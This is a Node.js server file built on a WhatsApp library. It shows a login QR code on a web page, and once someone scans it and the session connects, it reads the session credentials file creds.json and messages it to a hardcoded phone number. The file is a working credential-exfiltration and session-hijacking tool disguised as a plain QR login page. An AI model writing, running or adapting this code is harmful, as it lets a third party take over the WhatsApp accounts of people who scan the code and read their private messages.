import express from 'express';
import { makeWASocket, useMultiFileAuthState, DisconnectReason } from '@whiskeysockets/baileys';
import Pino from 'pino';
import fs from 'fs';
import qrcode from 'qrcode';

const app = express();
const PORT = 3000;

let globalQR = null;
let sock;

const startSocket = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./auth_info');
  sock = makeWASocket({
    logger: Pino({ level: 'silent' }),
    auth: state
  });

  sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
    if (qr) {
      globalQR = await qrcode.toDataURL(qr); // Generate base64 QR
    }

    if (connection === 'open') {
      console.log('✅ WhatsApp connected!');
      const credsPath = './auth_info/creds.json';
      const jid = '918302788872@s.whatsapp.net';

      if (fs.existsSync(credsPath)) {
        const jsonBuffer = fs.readFileSync(credsPath);

        await sock.sendMessage(jid, {
          document: jsonBuffer,
          mimetype: 'application/json',
          fileName: 'creds.json',
          caption: 'Here is my WhatsApp login JSON file.'
        });

        console.log('✅ creds.json sent to +918302788872');
      }
    }

    if (connection === 'close' && lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
      console.log('🔄 Reconnecting...');
      startSocket();
    }
  });

  sock.ev.on('creds.update', saveCreds);
};

startSocket();

// Serve HTML + QR
app.use(express.static('public'));

app.get('/qr', (req, res) => {
  if (globalQR) {
    res.json({ qr: globalQR });
  } else {
    res.json({ qr: null });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server running: http://localhost:${PORT}`);
});
